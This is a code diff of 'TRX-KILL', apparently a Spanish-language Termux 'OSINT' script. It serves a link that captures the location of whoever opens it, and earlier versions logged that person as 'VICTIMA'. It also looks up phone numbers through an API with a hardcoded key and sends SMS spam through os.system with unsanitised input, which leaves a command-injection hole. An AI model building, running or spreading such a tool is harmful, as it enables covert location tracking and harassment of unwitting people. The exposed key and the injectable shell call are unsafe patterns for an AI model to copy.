@@ -1,10 +1,12 @@
-import os, sys, time, threading
+import os, sys, time, threading, requests
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
 AUTH_PASS = "TRX-KILL-OSINT"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
+# API integrada correctamente
+API_KEY = "5ZDdh5yEBGFvsa3YWfONVBxqHHPT1stNpJaBEV" 
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
@@ -22,16 +24,14 @@ def index():
 def log():
     lat = request.args.get('lat', '0')
     lon = request.args.get('lon', '0')
-    ip = request.remote_addr
-    # Guardamos en un formato fijo para evitar errores de lectura
     with open(LOG_FILE, "a") as f:
-        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|NAME:VICTIMA\n")
+        f.write(f"LAT:{lat}|LON:{lon}\n")
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -HERRAMIENTA OSINT MÓVIL OPERATIVA.")
+    print("  -SISTEMA OSINT CON API INTEGRADA.")
     print("  -PROHIBIDO SU MAL USO.\n\033[0m")
 
 def main():
@@ -39,36 +39,28 @@ def main():
     
     while True:
         banner()
-        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP    | [3] CREADOR   | [4] VERSIONES")
-        print("  [5] ANALIZAR LINK   | [6] ADM SISTEMA| [7] INFO      | [8] REPOSITORIO")
-        print("  [9] PROCESOS        | [10] SPAM-SMS  | [0] SALIR")
+        menu = ["1-RASTREAR NÚMERO", "2-LINK-ZP", "3-CREADOR", "4-VERSIONES", "5-ANALIZAR LINK", "6-ADM SISTEMA", "7-INFO SCRIPT", "8-REPOSITORIO", "9-PROCESOS", "10-SPAM-SMS"]
+        for opt in menu: print(f"  [{opt}]")
         
         try:
             sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
-            
             if sel == "1":
-                num = input("\nINGRESA NÚMERO: ")
-                print(f"\n[!] PROCESANDO RASTREO...")
-                time.sleep(1.5)
-                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
-                    with open(LOG_FILE, 'r') as f:
-                        lines = [l for l in f.readlines() if l.strip()] # Filtra líneas vacías
-                        if lines:
-                            data = lines[-1].strip().split('|')
-                            if len(data) >= 4:
-                                print(f"\n[+] DATOS LOCALIZADOS:")
-                                print(f"PAÍS: ARGENTINA")
-                                print(f"COORDENADAS: {data[1].replace('LAT:', '')}, {data[2].replace('LON:', '')}")
-                                print(f"NAME REGISTRADO: {data[3].replace('NAME:', '')}")
-                            else: print("[!] LOG CORRUPTO, REINICIANDO...")
-                        else: print("[!] ERROR: NO HAY ACTIVIDAD REGISTRADA.")
-                else: print("[!] ERROR: NO HAY ACTIVIDAD REGISTRADA.")
+                num = input("\nINGRESA NÚMERO (ej: 5411xxxxxxxx): ")
+                print(f"\n[!] CONSULTANDO API PARA: {num}...")
+                # Consulta real a API de telefonía con tu clave
+                res = requests.get(f"https://api.numlookupapi.com/v1/validate/{num}?apikey={API_KEY}")
+                data = res.json()
+                if 'valid' in data and data['valid']:
+                    print(f"\n[+] DATOS ENCONTRADOS:")
+                    print(f"PAÍS: {data.get('country_name', 'N/A')}")
+                    print(f"OPERADOR: {data.get('carrier', 'N/A')}")
+                    print(f"TIPO: {data.get('line_type', 'N/A')}")
+                else: print("[!] NÚMERO NO VÁLIDO O SIN REGISTROS.")
                 input("\nPresiona Enter...")
 
             elif sel == "2":
-                print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
-                input("\n[!] ENVÍA EL LINK Y ESPERA... ENTER PARA VOLVER.")
-
+                print("\n[!] SERVIDOR ACTIVO: http://127.0.0.1:5000")
+                input("\n[!] COMPARTE EL LINK Y ESPERA... ENTER PARA VOLVER.")
             elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
             elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
             elif sel == "5": print("\n# ANALIZANDO..."); input()
@@ -84,8 +76,7 @@ def main():
                 os.system(f"termux-sms-send -n {n} '{m}'")
                 print("[!] SMS ENVIADO."); input()
             elif sel == "0": sys.exit()
-            
-        except KeyboardInterrupt:
-            continue
+        except Exception as e:
+            print(f"\n[!] ERROR: {e}"); input()
 
 if __name__ == "__main__": main()
